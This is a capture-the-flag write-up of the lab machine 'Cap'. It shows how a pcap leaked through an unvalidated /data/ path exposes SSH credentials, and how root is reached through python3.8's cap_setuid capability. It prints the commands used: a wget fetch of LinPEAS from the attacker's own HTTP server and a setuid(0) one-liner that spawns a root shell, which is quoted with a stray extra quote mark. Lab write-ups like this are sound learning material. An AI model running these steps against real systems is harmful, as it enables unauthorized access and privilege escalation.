# Cap

<figure><img src="../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

## Enumeration

Nmap as always, gives 3 ports open : SSH, FTP , HTTP.

<figure><img src="../.gitbook/assets/image (66).png" alt=""><figcaption><p>NMAP output.</p></figcaption></figure>

Before checking what's hosted on port 80, I'll try getting what's available on the ftp server and download it on my machine using this command:

```shell-session
$ wget -m --no-passive ftp://annonymous:annonymous@cap.htb
```

Which resulted in nothing. So we move on. Here's what we found on port 80

<figure><img src="../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

Poking around a bit, letting out nmap and ffuf going on the background we found out that network status is showing us the incoming network traffic to the server:

<figure><img src="../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

Nothing interesting for now, same goes for the IP config panel.

Meanwhile, Ffuf and nmap scripts didn't give us much to exploit.

So looking at the Security snapshot panel which redirected us to /data/7:

<figure><img src="../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

Trying some path traversal didn't work because there's input sanitization.

So upon trying to access another data then the 7th IT WORKED! and intuitively we went to `/data/0` and download the `.pcap` file.

## Wireshark

<figure><img src="../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

## User flag

Looking around the protocols  we found clear-text credentials for the user nathan which connected us successfully through ssh:

<figure><img src="../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

## Priv esc

The sudo -l command can't be used since we don't have the perms so to enumerate further i downloaded LinPEAS.sh from my custom python http server:

```shell-session
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

And then downloaded it with a simple wget command:

```shell-session
$ wget http://10.10.14.60:8000/linPEAS.sh
```

{% hint style="danger" %}
You must put the file you want to download in the same directory from where you launched the python http server to be able to access it.
{% endhint %}

Upon enumeration, we got an interesting file with interesting capabilities:

<figure><img src="../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

> ## From capabilities(7) — Linux manual page
>
> ```
>        For the purpose of performing permission checks, traditional UNIX
>        implementations distinguish two categories of processes:
>        privileged processes (whose effective user ID is 0, referred to
>        as superuser or root), and unprivileged processes (whose
>        effective UID is nonzero).  Privileged processes bypass all
>        kernel permission checks, while unprivileged processes are
>        subject to full permission checking based on the process's
>        credentials (usually: effective UID, effective GID, and
>        supplementary group list).
>
>        Starting with Linux 2.2, Linux divides the privileges
>        traditionally associated with superuser into distinct units,
>        known as capabilities, which can be independently enabled and
>        disabled.  Capabilities are a per-thread attribute.
> ```

Diving into cap\_setuid here's what it does:

In Linux, the CAP\_SETUID and CAP\_SETGID capabilities allow a process to change its UID and GID, respectively, providing control over user and group identity management. Attackers may leverage a misconfiguration for exploitation in order to escalate their privileges to root.

So we need a python script that changes the uid to 0 (root) and simply pop a shell. Here's one:

```python
import os; os.setuid(0); os.system("/bin/bash")'
```

```shell-session
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")''
```

{% hint style="success" %}
And we succesfully got the flag!
{% endhint %}

<figure><img src="../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
